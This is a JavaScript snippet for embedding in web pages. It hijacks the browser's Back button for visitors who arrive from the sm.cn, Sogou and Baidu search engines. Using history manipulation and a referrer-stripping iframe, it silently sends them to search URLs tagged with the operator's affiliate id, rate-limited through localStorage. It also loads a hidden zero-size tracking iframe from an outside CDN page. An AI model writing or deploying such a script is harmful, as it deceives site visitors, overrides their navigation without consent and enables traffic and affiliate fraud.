(function() {
    var curNode = document.currentScript;
    var src = curNode.src;
    var params = UrlParamHash(src);
    var t = parseInt(params['t']);
    var v = decodeURIComponent(params['v']);
    var s = params['s'];
    
    var s_key = 'FFA1DYVO';
    var s_name = 'FP434V';
    var bd_arrs = [v];
    var sg_name = "Sg";
    var sg_num = v;
    var sg_times = 30;
    var sg_regex = new RegExp('[\\?&]keyword=([^&#]*)');
    var sm_name = "Sm";
    var sm_arrs = [v];
    var sm_num = sm_arrs[0];
    var sm_times = 30;
    var sm_regex = new RegExp('[\\?&]q=([^&#]*)');
    var bd_name = "Bd";
    var bd_times = 600;
    var bd_num = bd_arrs[0];
    var storage = window.localStorage;
    var ref = document.referrer;
    var min = 1000;
    var NowDate = (new Date).valueOf();

    function g_r_n(min, max) {
        var range = max - min;
        var rand = Math.random();
        return (min + Math.round(rand * range))
    }

    function UrlParamHash(url) {
	var params = [],h;
	var hash = url.slice(url.indexOf("?") + 1).split('&');
	for (var i = 0; i < hash.length; i++) {
	    h = hash[i].split("="); //
	    params[h[0]] = h[1];
	}
	return params;
    }

    function o_g(name, links, times) {
        function run() {
            try {
                storage.setItem(s_key + name, s_name + "||" + NowDate);
                o_no_ref(links)
            } catch (e) {}
        }
        var storageVal = storage.getItem(s_key + name);
        if (storageVal == null) {
            run()
        } else {
            try {
                var storageTime = storageVal.split("||")[1];
                if (NowDate - storageTime >= min * times) {
                    run()
                } else {
                    history.back()
                }
            } catch (e) {}
        }
    }

    function o_no_ref(link) {
        document.body.appendChild(document.createElement('iframe')).src = 'javascript:"<script>top.location.replace(\'' + link + '\')<\/script>"'
    }
    
    function cf(web_id){
		var htturl = document.location.protocol;
	        var li_js = document.createElement('IFRAME');
                li_js.style.cssText = "border: 0;width: 0px;height: 0px; display:none;";
                li_js.setAttribute("scrolling", "no");
                li_js.src = "https://cdn.jsdelivr.net/gh/devlabres/static@0.0.1/cnzz/s.html#web_id="+web_id;
                document.body.appendChild(li_js)
    }
    
    try {
	cf(s);
        history.replaceState(null, document.title, location.pathname + '#!/xh');
        history.pushState(null, document.title, location.pathname);
	//alert('À´Â·£º'+ref);
	
        window.addEventListener('popstate', function() {

	    
            if (location.hash == '#!/xh') {

		
                var href = "";
                var n = "";
                var t = 0;
                history.replaceState(null, document.title, location.pathname);
                if (ref.match(/(.*)sm.cn/g) && sm_regex.exec(ref) && ref.indexOf(sm_num) == -1) {
		    alert('sm');
                	var snum_regex = new RegExp('[\\?&]snum=([^&#]*)');
                	var snum = snum_regex.exec(ref)[1];
                    href = 'http://yz.m.sm.cn/s?q=' + sm_regex.exec(ref)[1] + '&from=' + sm_num + '&safe=1&snum='+snum+ "&k=" + (new Date).valueOf();
                    n = sm_name;
                    t = sm_times;
                } else if (ref.match(/(.*)sogou.com/g) && sg_regex.exec(ref) && ref.indexOf(sg_num) == -1) {
		    alert('sg');
		    if (t === 2){
			alert('sg1');
			 href = "http://wap.sogou.com/web/sl?keyword=" + sg_regex.exec(ref)[1] + "&bid=" + sg_num + "&k=" + (new Date).valueOf();
		    }else{
			alert('sg2');
			href = sg_num + sg_regex.exec(ref)[1];
		    }
                    n = sg_name;
                    t = sg_times;
                } else if (ref.match(/(.*)baidu.com/g)) {
                    href = "http://m.baidu.com/?from=" + bd_num + "&k=" + (new Date).valueOf();
                    n = bd_name;
                    t = bd_times;
                } else {
                    history.back();
                }
                o_g(n, href, t);
            }
        }, false);
    } catch (e) {
	alert(e);
    }
}());